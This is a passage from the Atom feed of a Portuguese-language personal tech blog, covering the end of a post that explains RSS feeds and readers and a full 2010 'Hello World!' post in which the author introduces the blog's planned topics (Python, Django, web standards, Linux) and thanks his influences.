&lt;em&gt;sites&lt;/em&gt; de notícias para manter-se atualizado. Nem todos os sites possuem
atualizações, e lá se foi tempo precioso da sua vida visitando o dito cujo.&lt;/p&gt;
&lt;p&gt;Certo dia, você visita um &lt;a href="http://klauslaube.com.br" title="O blog pode até ser simpático, mas o autor não =]"&gt;&lt;em&gt;blog&lt;/em&gt; simpático&lt;/a&gt;
e o autor lhe fala sobre &lt;em&gt;RSS&lt;/em&gt;. Ele promete que você não precisa ficar
saltitando de &lt;em&gt;blog&lt;/em&gt; em &lt;em&gt;blog&lt;/em&gt; procurando por novos artigos. O autor lhe
promete que existem programas que visitam uma determinada &lt;em&gt;URL&lt;/em&gt; destes sites
procurando por novidades, este programa lhe traz o resumo (as vezes até mesmo
a notícia completa) de todos os sites que você usualmente visita. Você leva
muito menos tempo para atualizar-se sobre as coisas que estão acontecendo no mundo.&lt;/p&gt;
&lt;p&gt;Esta “determinada URL” que o tal programa visita é chamada de &lt;em&gt;Feed RSS&lt;/em&gt;.
Este programa que você utiliza para visitar esta &lt;em&gt;URL&lt;/em&gt; chama-se “cliente RSS“,
“agregador” ou “leitor RSS“. E o tal do &lt;em&gt;RSS&lt;/em&gt; na verdade é um padrão que
sistemas como o que alimenta este &lt;em&gt;blog&lt;/em&gt; e os leitores &lt;em&gt;RSS&lt;/em&gt;
usam para se comunicar.&lt;/p&gt;
&lt;p&gt;Vulgarmente falando, é um formato para divulgação de artigos.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Está em dúvida sobre qual cliente &lt;em&gt;RSS&lt;/em&gt; escolher?
&lt;a href="http://pt.wikipedia.org/wiki/Anexo:Lista_de_agregadores_de_feed" title="Escolha o agregador RSS do seu agrado"&gt;Esta lista pode te ajudar&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Agora que você tem ideia do que é &lt;em&gt;RSS&lt;/em&gt;, não deixe de
&lt;a href="http://www.klauslaube.com.br/feed/rss.xml" title="Adicione este blog ao seu leitor RSS"&gt;adicionar este &lt;em&gt;blog&lt;/em&gt; no seu leitor&lt;/a&gt;.&lt;/p&gt;</content><category term="informativos"></category><category term="rss"></category><category term="web"></category></entry><entry><title>Hello World!</title><link href="https://klauslaube.com.br/2010/11/12/hello-world.html" rel="alternate"></link><published>2010-11-12T20:10:00-02:00</published><updated>2010-11-12T20:10:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-12:/2010/11/12/hello-world.html</id><summary type="html">&lt;p&gt;Por dois longos anos esperei por este momento (talvez tenha esperado até demais),
mas enfim… posso dizer que tenho um &lt;em&gt;blog&lt;/em&gt;!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Devo confidenciar. Já trabalhei com &lt;em&gt;WordPress&lt;/em&gt; antes, mas sempre como o cara
que estava desenvolvendo um &lt;em&gt;Blog/CMS&lt;/em&gt; para alguém. Desta vez eu posso me
considerar “do outro lado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Por dois longos anos esperei por este momento (talvez tenha esperado até demais),
mas enfim… posso dizer que tenho um &lt;em&gt;blog&lt;/em&gt;!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Devo confidenciar. Já trabalhei com &lt;em&gt;WordPress&lt;/em&gt; antes, mas sempre como o cara
que estava desenvolvendo um &lt;em&gt;Blog/CMS&lt;/em&gt; para alguém. Desta vez eu posso me
considerar “do outro lado”, e é difícil hein?! Pretendo contribuir com vocês,
caros leitores, com todo o conhecimento que possuo (e seguindo a regra da
reciprocidade, absorver conhecimento de vocês também).&lt;/p&gt;
&lt;h2&gt;O que você pode esperar deste Blog&lt;/h2&gt;
&lt;p&gt;Eu acredito que já trilhei um longo caminho com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt;,
passando pelo &lt;a href="http://www.joomla.org/" title="Visite o site oficial do CMS Joomla!"&gt;&lt;em&gt;Joomla!&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://www.wordpress.org/" title="Visite o site oficial da engine de blogs Wordpress"&gt;&lt;em&gt;WordPress&lt;/em&gt;&lt;/a&gt;,
&lt;em&gt;Spaghetti&lt;/em&gt;, &lt;a href="http://codeigniter.com/" title="Visite o site oficial da framework CodeIgniter"&gt;&lt;em&gt;CodeIgniter&lt;/em&gt;&lt;/a&gt;
e mais recentemente pela &lt;a href="http://cakephp.org/" title="Visite o site da framework para desenvolvimento rápido, CakePHP"&gt;&lt;em&gt;CakePHP&lt;/em&gt;&lt;/a&gt;.
Pretendo sim falar sobre &lt;em&gt;PHP&lt;/em&gt;, mas de uma forma bem “light“, pois na verdade
o objetivo principal deste &lt;em&gt;blog&lt;/em&gt; é transmitir meus conhecimentos sobre
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;,
padrões &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;,
&lt;em&gt;Software&lt;/em&gt; Livre e &lt;a href="https://klauslaube.com.br/tag/linux.html" title="Leia mais sobre Linux"&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Não que eu seja um “guru” nas tecnologias mencionadas, mas aprendi contribuindo
com o &lt;a href="http://profissionaisti.com.br" title="Leia sobre tecnologia, telecomunicações, desenvolvimento, entre outros"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;
que escrever &lt;em&gt;posts&lt;/em&gt; é uma excelente maneira de aprender. Então podem apostar
que eu vou estar aprendendo junto com vocês.&lt;/p&gt;
&lt;h2&gt;Casa de ferreiro…&lt;/h2&gt;
&lt;p&gt;Eu sei. Vocês devem estar pensando “como raios um desenvolvedor &lt;em&gt;Web&lt;/em&gt; tem um
&lt;em&gt;blog&lt;/em&gt; com um template free?“. Sou programador, meus dons artísticos não são
nada admiráveis. Portanto resolvi: O &lt;em&gt;Blog&lt;/em&gt; será um meio de ensino e aprendizagem.
Um &lt;em&gt;hobby&lt;/em&gt;. Não irei me preocupar tanto com a sua composição.&lt;/p&gt;
&lt;p&gt;Não que eu não vá aplicar minhas (poucas) habilidades em &lt;em&gt;WordPress&lt;/em&gt; neste blog.
Só pretendo fazer deste uma espécie de “jardim Zen“, ou seja, quando achar que
vai ser maneiro escrever um tema todo em &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt;
com altos efeitos em &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;
(se eu tiver tempo para isso), com certeza farei… e com certeza mostrarei como fiz,
e podem ter certeza que este tema será &lt;em&gt;open source&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Are you ready?&lt;/h2&gt;
&lt;p&gt;Gostaria de agradecer ao &lt;a href="http://www.twitter.com/jcaset/" title="Visite o perfil do Jackson no Twitter"&gt;&lt;em&gt;Jackson Caset&lt;/em&gt;&lt;/a&gt;
do &lt;a href="http://profissionaisti.com.br" title="Leia sobre tecnologia, telecomunicações, desenvolvimento, entre outros"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://twitter.com/marinhobrandao/" title="O que será que o Marinho está twitando agora?"&gt;&lt;em&gt;Marinho Brandão&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://www.henriquebastos.net/" title="Aspirante a Pythonista? Visite o blog do Henrique Bastos"&gt;&lt;em&gt;Henrique Bastos&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://www.franciscosouza.com.br/" title="O blog do Franscisco é uma excelente fonte para informações sobre desenvolvimento"&gt;&lt;em&gt;Franscisco Souza&lt;/em&gt;&lt;/a&gt;,
ao &lt;a href="http://akitaonrails.com/" title="Você não conhece o Akita?!"&gt;&lt;em&gt;Akita&lt;/em&gt;&lt;/a&gt;,
pessoal do &lt;a href="http://www.tableless.com.br/" title="[IMO] A melhor referência sobre padrões Web no Brasil"&gt;&lt;em&gt;Tableless&lt;/em&gt;&lt;/a&gt;
e ao &lt;em&gt;Pedro&lt;/em&gt; do &lt;a href="http://www.pinceladasdaweb.com.br/blog/" title="Outra excelente fonte para desenvolvedores Web"&gt;&lt;em&gt;Pinceladas da Web&lt;/em&gt;&lt;/a&gt;.
Eles podem até não saber, mas foram influências para a criação deste &lt;em&gt;blog&lt;/em&gt; …
sem dúvida, se não fossem por estes caras, eu estaria jogando &lt;em&gt;Winning Eleven&lt;/em&gt; numa hora dessas :)&lt;/p&gt;
&lt;p&gt;Boa leitura…&lt;/p&gt;</content><category term="informativos"></category></entry></feed>